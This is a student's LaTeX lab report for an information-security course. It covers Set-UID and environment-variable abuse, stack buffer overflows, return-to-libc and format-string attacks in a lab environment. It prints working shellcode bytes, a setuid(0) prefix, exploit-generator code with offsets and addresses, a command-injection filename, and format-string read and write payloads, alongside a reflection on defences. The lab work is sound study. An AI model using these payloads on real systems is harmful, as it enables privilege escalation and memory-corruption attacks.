@@ -1,0 +1,622 @@
+\documentclass[11pt]{article}
+
+\usepackage[a4paper,margin=1in]{geometry}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{lmodern}
+\usepackage{xcolor}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{hyperref}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+\usepackage{fvextra}
+\usepackage{caption}
+
+\hypersetup{
+    colorlinks = true,
+    linkcolor = blue!50!black,
+    urlcolor = blue!50!black,
+    pdftitle = {Assignment 2},
+    pdfauthor = {Chen Baizheng}
+}
+
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{CS5293 Topics on Information Security}
+\rhead{Assignment 2}
+\cfoot{\thepage}
+\setlength{\headheight}{14pt}
+
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{0.7em}
+\setlist[itemize]{itemsep = 0.2em, topsep = 0.2em}
+
+\titleformat{\section}{\Large\bfseries}{\thesection}{0.8em}{}
+\titleformat{\subsection}{\large\bfseries}{\thesubsection}{0.8em}{}
+\titleformat{\subsubsection}{\normalsize\bfseries}{\thesubsubsection}{0.8em}{}
+
+\DefineVerbatimEnvironment{codeblock}{Verbatim}{
+    breaklines = true,
+    breakanywhere = true,
+    fontsize = \small,
+    frame = single,
+    framesep = 3mm,
+    rulecolor = \color{black!25}
+}
+
+\newcommand{\img}[2]{
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=\linewidth]{#1}
+        \caption{#2}
+    \end{figure}
+}
+
+\begin{document}
+\hypersetup{pageanchor = false}
+\pagenumbering{gobble}
+
+\begin{titlepage}
+    \centering
+    \vspace*{2.5cm}
+    {\Huge \bfseries Assignment 2 \par}
+    \vspace{1.2cm}
+    {\Large CS5293 Topics on Information Security \par}
+    \vspace{2cm}
+    {\Large Chen Baizheng \par}
+    \vspace{0.3cm}
+    {\large 72510800 \par}
+    \vfill
+    {\large \today \par}
+\end{titlepage}
+
+\tableofcontents
+\newpage
+\hypersetup{pageanchor = true}
+\pagenumbering{arabic}
+
+\section{Scope}
+
+This report consolidates the completed work for Assignment 2. The write-up is organized by the four major parts covered in the assignment: environment-variable and Set-UID behavior, buffer-overflow exploitation, return-to-libc attacks, and format-string vulnerabilities. For each task, I embedded the essential command output, attack inputs, observations, and screenshot evidence directly in the report.
+
+To keep the report comprehensive but still readable, I also included representative code and payload snippets for the custom helper programs and exploit generators, rather than listing only final screenshots.
+
+\section{Task 2: Environment Variable and Set-UID Program}
+
+\subsection{Task 2.1 Manipulating Environment Variables}
+
+I used \texttt{printenv} to inspect the environment and demonstrated the full \texttt{export} and \texttt{unset} cycle with a test variable.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes \texttt{printenv}/\texttt{env} output, the \texttt{export} and \texttt{unset} demonstration, and screenshot evidence of the results.
+
+\begin{codeblock}
+$ export TASK2_DEMO="test string"
+$ printenv TASK2_DEMO
+test string
+
+$ unset TASK2_DEMO
+$ printenv TASK2_DEMO
+\end{codeblock}
+
+This confirms the required behaviors for creating, reading, and removing environment variables.
+
+\img{tasks/task2/task01/output/task01_env_demo.png}{Task 2.1 environment-variable demonstration}
+
+\subsection{Task 2.2 Environment Variable and Set-UID Programs}
+
+I compiled the Set-UID environment dumper, ran it as \texttt{seed}, and checked whether \texttt{PATH}, \texttt{LD\_LIBRARY\_PATH}, and \texttt{ANY\_NAME} were inherited by the privileged child process.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the Set-UID program output, which of \texttt{PATH}, \texttt{LD\_LIBRARY\_PATH}, and \texttt{ANY\_NAME} were inherited, and an explanation of the surprising sanitized behavior.
+
+\begin{codeblock}
+ANY_NAME=seed_magic
+PATH=/tmp/task2_path:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+\end{codeblock}
+
+\texttt{LD\_LIBRARY\_PATH} was absent, while \texttt{PATH} and \texttt{ANY\_NAME} were preserved. This shows that dangerous dynamic-loader variables are sanitized for Set-UID execution, but normal user variables are still inherited.
+
+\img{tasks/task2/task02/output/task02_summary.png}{Task 2.2 Set-UID environment-variable result}
+
+\subsection{Task 2.3 The \texttt{PATH} Environment Variable and Set-UID Programs}
+
+I used a malicious replacement \texttt{ls} program that prints its real and effective UIDs. Because the vulnerable Set-UID program invoked \texttt{system("ls")}, the shell resolved the command using \texttt{PATH}.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the custom \texttt{ls.c} code, screenshots showing the Set-UID program ran my code instead of \texttt{/bin/ls}, the observed effective UID, and a short explanation of the \texttt{PATH}-hijacking mechanism.
+
+\begin{codeblock}
+#include <stdio.h>
+#include <unistd.h>
+
+int main(void)
+{
+    printf("This is my ls program\n");
+    printf("My real uid is: %d\n", getuid());
+    printf("My effective uid is: %d\n", geteuid());
+    return 0;
+}
+\end{codeblock}
+
+\begin{codeblock}
+Default /bin/sh -> dash
+This is my ls program
+My real uid is: 1000
+My effective uid is: 1000
+
+Countermeasure disabled
+This is my ls program
+My real uid is: 1000
+My effective uid is: 0
+\end{codeblock}
+
+The experiment shows that \texttt{PATH} manipulation can redirect a Set-UID program to attacker code. Whether the attacker keeps root privilege depends on whether the invoked shell drops privilege.
+
+\img{tasks/task2/task03/output/task03_summary.png}{Task 2.3 \texttt{PATH} hijacking result}
+
+\subsection{Task 2.4 The \texttt{LD\_PRELOAD} Environment Variable and Set-UID Programs}
+
+I built a shared library that overrides \texttt{sleep()} and tested it under four privilege configurations.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes output for all four required execution conditions, the Step 3 experiment result, and an explanation of how secure execution suppresses \texttt{LD\_PRELOAD} for privileged transitions.
+
+\begin{codeblock}
+Case 1: regular program run by seed
+I am not sleeping!
+
+Case 2: setuid-root program run by seed
+[no output]
+
+Case 3: setuid-root program run by root
+I am not sleeping!
+
+Case 4: setuid-user1 program run by seed
+[no output]
+\end{codeblock}
+
+The result shows that \texttt{LD\_PRELOAD} works only when there is no privileged transition. When real and effective UIDs differ, the loader enters secure-execution mode and strips the variable.
+
+\img{tasks/task2/task04/output/task04_summary.png}{Task 2.4 \texttt{LD\_PRELOAD} behavior}
+
+\subsection{Task 2.5 Invoking External Programs Using \texttt{system()} Versus \texttt{execve()}}
+
+I tested the same injected filename against two wrappers:
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the integrity-compromising input used against \texttt{system()}, the \texttt{execve()} comparison with screenshots, and an explanation of why shell interpretation makes \texttt{system()} vulnerable while \texttt{execve()} is not.
+
+\begin{codeblock}
+/tmp/task25/secret.txt; echo compromised > /tmp/task25/protected.txt
+\end{codeblock}
+
+\begin{codeblock}
+System() attack output
+TOP SECRET
+
+Execve() attack output
+cat: '/tmp/task25/secret.txt; echo compromised > /tmp/task25/protected.txt': No such file or directory
+
+protected.txt contents:
+compromised
+\end{codeblock}
+
+\texttt{system()} was vulnerable because the shell interpreted metacharacters and executed a second command. \texttt{execve()} was not vulnerable because it treated the full string as a literal filename.
+
+\img{tasks/task2/task05/output/task05_summary.png}{Task 2.5 \texttt{system()} versus \texttt{execve()}}
+
+\subsection{Task 2.6 Capability Leaking}
+
+I ran the Set-UID capability-leaking demo against a root-owned \texttt{/etc/zzz} and compared the file contents before and after execution.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes screenshot evidence showing whether \texttt{/etc/zzz} changed. It also explains why the write remained possible after the privilege drop and briefly defines the capability leak demonstrated by the program.
+
+\begin{codeblock}
+Before:
+Original line
+
+After:
+Original line
+Malicious Data
+\end{codeblock}
+
+The file remained writable through the already-open privileged file descriptor even after the program dropped its effective root identity.
+
+\img{tasks/task2/task06/output/task06_summary.png}{Task 2.6 capability leak result}
+
+\section{Task 3: Buffer Overflow Vulnerability}
+
+\subsection{Task 3.2 Running Shellcode}
+
+I compiled the provided shellcode launcher as a 32-bit executable, enabled an executable stack, and ran it from the \texttt{seed} account.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the compilation/execution evidence, whether a shell was successfully invoked, and a short observation summary.
+
+\begin{codeblock}
+$ printf "whoami\nexit\n" | ./call_shellcode
+seed
+\end{codeblock}
+
+This confirmed that the provided shellcode worked before it was used in the overflow exploit.
+
+\img{tasks/task3/task01/output/task01_summary.png}{Task 3.2 shellcode execution}
+
+\subsection{Task 3.4 Exploiting the Vulnerability}
+
+I completed the exploit generator by filling \texttt{badfile} with a NOP sled, placing the shellcode near the end of the 517-byte input, and overwriting the saved return address with the address of the \texttt{str} buffer in \texttt{main()}.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the completed exploit logic, the chosen return address and offset, how they were determined, and full attack evidence from \texttt{badfile} generation through root-shell execution.
+
+\begin{codeblock}
+Return address: 0x40800b6f
+Offset: 28
+\end{codeblock}
+
+Representative exploit logic:
+
+\begin{codeblock}
+shellcode = (
+    "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
+    "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
+).encode("latin-1")
+
+content = bytearray(0x90 for _ in range(517))
+start = 517 - len(shellcode)
+content[start:] = shellcode
+content[offset:offset + 4] = (ret).to_bytes(4, byteorder = "little")
+\end{codeblock}
+
+\begin{codeblock}
+$ ./exploit_arg 0x40800b6f 28
+ret = 0x40800b6f
+offset = 28
+shellcode_start = 492
+
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+\end{codeblock}
+
+This shows that the overwritten return address successfully redirected execution into the injected shellcode.
+
+\img{tasks/task3/task02/output/task02_summary.png}{Task 3.4 successful overflow exploit}
+
+\subsection{Task 3.5 Defeating dash's Countermeasure}
+
+I first verified dash's privilege-dropping behavior with two Set-UID test programs, then updated the exploit shellcode to prepend a \texttt{setuid(0)} system call.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the dash test with and without \texttt{setuid(0)}, the updated exploit behavior when \texttt{/bin/sh} points to \texttt{/bin/dash}, and a brief explanation of the difference.
+
+\begin{codeblock}
+Without setuid(0):
+uid=1000(seed) gid=1000(seed) groups=1000(seed)
+seed
+
+With setuid(0):
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+\end{codeblock}
+
+Updated shellcode prefix:
+
+\begin{codeblock}
+"\x31\xdb"      # xorl  %ebx, %ebx
+"\x31\xc0"      # xorl  %eax, %eax
+"\xb0\xd5"      # movb  $0xd5, %al
+"\xcd\x80"      # int   $0x80   ; setuid(0)
+\end{codeblock}
+
+\begin{codeblock}
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+\end{codeblock}
+
+This bypassed dash's default privilege-dropping logic.
+
+\img{tasks/task3/task03/output/task03_summary.png}{Task 3.5 defeating dash's countermeasure}
+
+\subsection{Task 3.6 Defeating Address Randomization}
+
+I repeated the attack without \texttt{setarch -R} and checked the kernel randomization setting in the container.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes evidence for the initial ASLR-enabled run, an explanation of why address randomization normally defeats fixed-address payloads, and the observed outcome in this emulated environment.
+
+\begin{codeblock}
+/proc/sys/kernel/randomize_va_space = 2
+\end{codeblock}
+
+However, the stack addresses remained stable:
+
+\begin{codeblock}
+str=0x40800b6f
+buffer=0x40800b1c
+ret_addr_slot=0x40800b3c
+\end{codeblock}
+
+\begin{codeblock}
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+\end{codeblock}
+
+In this emulated environment, ASLR was nominally enabled but did not move the relevant stack addresses, so the original exploit still worked.
+
+\img{tasks/task3/task04/output/task04_summary.png}{Task 3.6 address-randomization observation}
+
+\subsection{Task 3.7 Stack Guard Protection}
+
+I investigated Stack Guard under two build paths. The \texttt{x86-linux-musl} build did not emit a canary check in \texttt{bof()}, while the \texttt{x86-linux-gnu} build did.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the protected compilation context, the error-path evidence available in this environment, and an explanation of how the canary check detects and blocks the overflow before control reaches the forged return address.
+
+\begin{codeblock}
+228f9: 65 a1 14 00 00 00    movl   %gs:0x14, %eax
+228ff: 89 45 f8             movl   %eax, -0x8(%ebp)
+...
+2294f: 65 a1 14 00 00 00    movl   %gs:0x14, %eax
+22955: 8b 4d f8             movl   -0x8(%ebp), %ecx
+22958: 39 c8                cmpl   %ecx, %eax
+2295a: 75 0b                jne    0x22967 <bof+0x87>
+2296a: e8 b1 0d 06 00       calll  0x83720 <__stack_chk_fail>
+\end{codeblock}
+
+Because the required 32-bit glibc userland was unavailable in the container, I documented the defense through the emitted protected code path rather than a native runtime crash.
+
+\img{tasks/task3/task05/output/task05_summary.png}{Task 3.7 Stack Guard evidence}
+
+\subsection{Task 3.8 Non-executable Stack Protection}
+
+I recompiled the vulnerable program without an executable stack and reran the original exploit.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the \texttt{-z noexecstack} compilation result, screenshot evidence of the failed attack, and an explanation of why stack-resident shellcode cannot execute when the stack pages are marked non-executable.
+
+\begin{codeblock}
+$ printf "id\nwhoami\nexit\n" | ./stack_noexec
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+\end{codeblock}
+
+The return address still redirected control to the stack, but the stack page was no longer executable, so the CPU faulted immediately.
+
+\img{tasks/task3/task06/output/task06_summary.png}{Task 3.8 non-executable stack result}
+
+\section{Task 4: Return-to-libc Attack}
+
+\subsection{Task 4.5 Exploiting the Vulnerability}
+
+I completed the return-to-libc payload layout and validated the target addresses and overwrite slots.
+
+\textbf{What-to-report coverage.} This subsection explicitly covers the completed exploit configuration, the addresses of \texttt{system()}, \texttt{exit()}, and \texttt{/bin/sh}, the reasoning for the positions \(X\), \(Y\), and \(Z\), the Step 2 observation about omitting \texttt{exit()}, the Step 3 observation about environment-pointer fragility when the runtime context changes, and screenshot evidence.
+
+\begin{codeblock}
+system() = 0x0001a2bc
+exit()   = 0x0001a26e
+/bin/sh  = 0x40800f09
+X = 42
+Y = 34
+Z = 38
+\end{codeblock}
+
+Representative payload layout:
+
+\begin{codeblock}
+content[Y:Y + 4] = system_addr.to_bytes(4, byteorder = "little")
+content[Z:Z + 4] = shell_addr.to_bytes(4, byteorder = "little")
+content[X:X + 4] = exit_addr.to_bytes(4, byteorder = "little")
+\end{codeblock}
+
+\begin{codeblock}
+shell=0x40800f09
+buffer=0x40800cca
+saved_ebp=0x40800ce8
+ret_slot=0x40800cec
+arg_slot=0x40800cf0
+ret_offset=34
+arg_offset=38
+Returned Properly
+\end{codeblock}
+
+I also confirmed that the \texttt{MYSHELL} address changed under the actual Set-UID \texttt{seed} runtime, and I verified separately that helper binaries calling \texttt{system("/bin/sh")} executed with effective root privilege. However, the final return-to-libc hijack remained unstable in this QEMU-emulated Set-UID path and consistently crashed instead of producing a stable root shell.
+
+\begin{codeblock}
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+\end{codeblock}
+
+Because the baseline attack already crashed before a stable shell appeared, removing \texttt{exit()} or changing the program name did not produce a stronger end-to-end result than the recorded failure analysis.
+
+\img{tasks/task4/task01/output/task01_summary.png}{Task 4.5 return-to-libc summary}
+
+\subsection{Task 4.6 Address Randomization}
+
+I repeated the Task 4.5 setup with address randomization enabled.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes screenshot evidence showing the observed behavior with ASLR enabled and a direct explanation of why address randomization normally makes return-to-libc harder.
+
+\begin{codeblock}
+$ cat /proc/sys/kernel/randomize_va_space
+2
+\end{codeblock}
+
+Even with that setting, the helper address remained stable:
+
+\begin{codeblock}
+Root runs:
+0x40800f0d
+0x40800f0d
+0x40800f0d
+0x40800f0d
+0x40800f0d
+
+seed runs:
+0x40800f3a
+0x40800f3a
+0x40800f3a
+0x40800f3a
+0x40800f3a
+\end{codeblock}
+
+\begin{codeblock}
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+\end{codeblock}
+
+So ASLR was reported as enabled, but the critical addresses did not move in this emulated runtime.
+
+\img{tasks/task4/task02/output/task02_summary.png}{Task 4.6 address-randomization summary}
+
+\subsection{Task 4.7 Stack Guard Protection}
+
+I rebuilt the vulnerable program with Stack Guard enabled.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the protected compilation command, screenshot evidence, and an explanation of how Stack Guard prevents the forged return into \texttt{system()}.
+
+\begin{codeblock}
+zig cc -target x86-linux-musl assignment2/tasks/task4/task01/retlib.c \
+    -o assignment2/tasks/task4/task03/output/retlib_stackguard \
+    -DBUFSIZE=22 -fstack-protector-all -no-pie -z noexecstack
+\end{codeblock}
+
+The protected binary contains the expected canary symbols and the usual canary load/check sequence:
+
+\begin{codeblock}
+__stack_chk_guard
+__stack_chk_fail
+__stack_chk_fail_local
+\end{codeblock}
+
+\begin{codeblock}
+00019d50 <bof>:
+   19d59: 65 a1 14 00 00 00    movl   %gs:0x14, %eax
+   19d5f: 89 45 fc             movl   %eax, -0x4(%ebp)
+   ...
+   19dac: 65 a1 14 00 00 00    movl   %gs:0x14, %eax
+   19db5: 39 c8                cmpl   %ecx, %eax
+   19dc1: e8 fd 04 00 00       calll  __stack_chk_fail_local
+\end{codeblock}
+
+Running the same malicious input against the protected binary still ended with a segmentation fault in this emulator, but the binary clearly contained the Stack Guard logic that would abort the process before the forged return to \texttt{system()} on a native runtime.
+
+\img{tasks/task4/task03/output/task03_summary.png}{Task 4.7 Stack Guard summary}
+
+\section{Task 5: Format String Vulnerability}
+
+\subsection{Task 5.1 Crash the Program}
+
+Because the supplementary source file was empty, I reconstructed the vulnerable lab program locally and first used a stack-probe input to locate the integer input on the \texttt{printf(user\_input)} argument list.
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the exact crashing input string, screenshot evidence, and a brief explanation of why the input dereferences an invalid address.
+
+\begin{codeblock}
+MARK.40800d3c.40800eff.0.0.0.0.0.0.40804040.40804044.40804044.40804040.40804044.40804044.40804040.0.0.0.0.0.55667788.40804040.4b52414d...
+\end{codeblock}
+
+Representative vulnerable logic:
+
+\begin{codeblock}
+scanf("%d", &int_input);
+scanf("%s", user_input);
+printf(user_input);
+\end{codeblock}
+
+The decimal integer became the 21st consumed argument. I then used the following crashing input:
+
+\begin{codeblock}
+1
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
+\end{codeblock}
+
+The first 20 \texttt{\%x} conversions consumed stack arguments 1 through 20, and the final \texttt{\%s} dereferenced argument 21, which was \texttt{int\_input = 1}. That forced \texttt{printf} to read from address \texttt{0x00000001} and crash.
+
+\begin{codeblock}
+The variable secret's address is 0x40800d38 (on stack)
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+\end{codeblock}
+
+\img{tasks/task5/task01/output/task01_summary.png}{Task 5.1 crash payload}
+
+\subsection{Task 5.2 Print out the \texttt{secret[1]} Value}
+
+The runtime address of \texttt{secret[1]} was \texttt{0x40804044}, whose decimal form is \texttt{1082146884}. I used that as the integer input and reused the same 20-argument walk:
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the decimal integer input, the format string input, screenshot evidence of the printed secret, and a brief explanation of how the final \texttt{\%s} reads from the target address.
+
+\begin{codeblock}
+1082146884
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
+\end{codeblock}
+
+After 20 \texttt{\%x} conversions, the final \texttt{\%s} used argument 21, which pointed to \texttt{secret[1]}. Since \texttt{secret[1] = 0x00000055}, the first byte was ASCII \texttt{U} and the next byte was \texttt{0x00}, so the output ended with \texttt{U}.
+
+\begin{codeblock}
+... .U
+The original secrets: 0x44 -- 0x55
+The new secrets: 0x44 -- 0x55
+\end{codeblock}
+
+This demonstrates that \texttt{secret[1]} contained \texttt{0x55}.
+
+\img{tasks/task5/task02/output/task02_summary.png}{Task 5.2 reading \texttt{secret[1]}}
+
+\subsection{Task 5.3 Modify the \texttt{secret[1]} Value}
+
+I then used \texttt{\%n} to write through the same stack slot:
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the decimal integer input, the format string input, screenshot evidence that \texttt{secret[1]} changed, and a brief explanation of how \texttt{\%n} writes to the target address.
+
+\begin{codeblock}
+1082146884
+%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%n
+\end{codeblock}
+
+The 20 \texttt{\%c} conversions consumed arguments 1 through 20 and printed exactly 20 characters in total. The final \texttt{\%n} used argument 21, namely \texttt{int\_input = 0x40804044}, so it wrote \texttt{20} decimal (\texttt{0x14}) into \texttt{secret[1]}.
+
+\begin{codeblock}
+The original secrets: 0x44 -- 0x55
+The new secrets: 0x44 -- 0x14
+\end{codeblock}
+
+\img{tasks/task5/task03/output/task03_summary.png}{Task 5.3 modifying \texttt{secret[1]}}
+
+\subsection{Task 5.4 Modify the \texttt{secret[1]} Value to 80 Decimal}
+
+Finally, I controlled the exact printed-character count before \texttt{\%n}:
+
+\textbf{What-to-report coverage.} This subsection explicitly includes the decimal integer input, the final format string, screenshot evidence that \texttt{secret[1]} became exactly \texttt{0x50}, and a brief explanation of how the printed-character count was controlled.
+
+\begin{codeblock}
+1082146884
+%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%61c%n
+\end{codeblock}
+
+Here the first 19 \texttt{\%c} conversions printed 19 characters, and \texttt{\%61c} printed a field of width 61 using argument 20. Therefore the total number of characters printed before \texttt{\%n} was:
+
+\begin{codeblock}
+19 + 61 = 80
+\end{codeblock}
+
+The final \texttt{\%n} again used argument 21, \texttt{int\_input = 0x40804044}, and wrote \texttt{80} decimal (\texttt{0x50}) into \texttt{secret[1]}.
+
+\begin{codeblock}
+The original secrets: 0x44 -- 0x55
+The new secrets: 0x44 -- 0x50
+\end{codeblock}
+
+\img{tasks/task5/task04/output/task04_summary.png}{Task 5.4 precise write to \texttt{secret[1]}}
+
+\section{Overall Summary and Reflection}
+
+This assignment tied together four major security themes that are usually taught separately: privileged execution, stack-based memory corruption, code-reuse attacks, and format-string vulnerabilities. Performing the tasks end to end made the common pattern much clearer: unsafe interfaces become dangerous only when they intersect with a privileged execution context, controllable process state, or predictable memory layout.
+
+Task 2 showed that Set-UID programs are not isolated from user influence. Ordinary environment variables such as \texttt{PATH} still shape privileged behavior, while dangerous loader variables such as \texttt{LD\_PRELOAD} are sanitized only under specific secure-execution conditions. The \texttt{system()} versus \texttt{execve()} comparison also made an important engineering point: invoking a shell inside a privileged program expands the attack surface dramatically, even when the original program appears to perform only a simple read operation.
+
+Task 3 showed the classic control-flow hijack path from a stack overflow to injected shellcode execution. More importantly, the later subtasks demonstrated that exploitation is not just about finding one offset. It depends on shell behavior, address stability, stack executability, and compiler-inserted integrity checks. The dash countermeasure, Stack Guard, and non-executable stack all target different stages of the exploit chain, which is why no single defense should be treated as sufficient on its own.
+
+Task 4 extended the same idea to return-to-libc. Even when direct shellcode execution is blocked, an attacker can still try to reuse trusted code already loaded in memory. The main lesson from this part was that code-reuse attacks are highly sensitive to runtime details such as address layout, stack organization, and the exact execution environment. In this submission, the QEMU-based i386 path allowed me to verify the payload structure, addresses, and overwrite logic, but it did not produce a stable end-to-end root shell. That limitation is itself informative: exploit development is often constrained as much by environment fidelity as by the attack idea.
+
+Task 5 demonstrated that format-string bugs can be both read primitives and write primitives. A single unsafe \texttt{printf(user\_input)} call was enough to crash the program, leak the secret value, and then overwrite it with both an uncontrolled and a precisely chosen integer. This part was especially useful because it showed how attackers can move from information disclosure to arbitrary state modification without needing a traditional overflow.
+
+Overall, the assignment reinforced three practical conclusions. First, memory-unsafe code remains exploitable in multiple ways, so fixing only the most obvious bug pattern is not enough. Second, defense in depth matters: address randomization, canaries, non-executable memory, and privilege-dropping each remove a different attacker advantage. Third, secure programming is largely about eliminating dangerous compositions, such as privileged code plus shell interpretation, or attacker-controlled format strings plus unchecked variadic output functions.
+
+From an engineering perspective, the most valuable takeaway is that exploitability is a systems property rather than a single-code-line property. Compiler flags, shell implementations, runtime loaders, process credentials, emulator behavior, and binary layout all affected the outcomes observed in this assignment. That is why secure software development must combine safer code, safer build settings, and safer runtime design instead of relying on any one layer alone.
+
+\end{document}
